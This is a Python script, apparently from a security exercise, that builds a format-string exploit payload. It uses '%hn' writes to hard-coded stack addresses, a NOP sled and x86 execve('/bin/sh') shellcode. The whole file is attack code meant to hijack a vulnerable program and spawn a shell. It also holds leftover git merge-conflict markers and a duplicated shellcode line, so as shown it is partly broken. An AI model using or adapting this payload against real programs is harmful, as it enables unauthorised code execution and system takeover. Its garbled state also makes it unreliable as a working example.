import sys
import os
NOPSLED = b'\x90' * 0x300
SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

<<<<<<< HEAD
SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
=======
ADDRESSTOWRITE = b'BFFFE57C'
i = 1
ADDRESSOFSHELL = b'\xBF\xFF\xEF\xC8'
ADDRESSOFSHELL = bytearray(ADDRESSOFSHELL)
ADDRESSOFSHELL.reverse()
ADDRESSOFSHELL = bytes(ADDRESSOFSHELL)
>>>>>>> 8711a21439538d7a9a543b4d8b0baa0049f74310

ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[2:], 'little') - 2540
ADDRESSOFSHELL2 = int.from_bytes(ADDRESSOFSHELL[0:2], 'little') - ADDRESSOFSHELL1 - 2540
ADDRESSOFSHELL1 = bytes(str(ADDRESSOFSHELL1), 'utf-8')
ADDRESSOFSHELL2 = bytes(str(ADDRESSOFSHELL2), 'utf-8')

#ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[0:2], 'big') - 2540
#ADDRESSOFSHELL2 = int.from_bytes(ADDRESSOFSHELL[2:], 'big') - ADDRESSOFSHELL1 - 2540
#ADDRESSOFSHELL1 = bytes(str(ADDRESSOFSHELL1), 'utf-8')
#ADDRESSOFSHELL2 = bytes(str(ADDRESSOFSHELL2), 'utf-8')

ADDRESSTOWRITE1 = int(ADDRESSTOWRITE, 16)
ADDRESSTOWRITE1 = ADDRESSTOWRITE1.to_bytes(4, 'little')
ADDRESSTOWRITE2 = int(ADDRESSTOWRITE, 16) + 0X2
ADDRESSTOWRITE2 = ADDRESSTOWRITE2.to_bytes(4, 'little')

ADDRESSOFSTRING = b'BFFFEA58'
ADDRESSOFSHELLCODE = int(ADDRESSOFSTRING, 16) + 0x43
ADDRESSOFSHELLCODE = bytearray(ADDRESSOFSHELLCODE.to_bytes(4, 'little'))
LENTGHOFREQUIRED = 316

with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
    stdout.write(ADDRESSTOWRITE2 + b'AAAA' + ADDRESSTOWRITE1 + b'%08x'*316 + b'%' + ADDRESSOFSHELL1 + b'x' + b'%hn' + b'%' + ADDRESSOFSHELL2 + b'x' +  b'%hn' + NOPSLED + SHELLCODE + b'\n')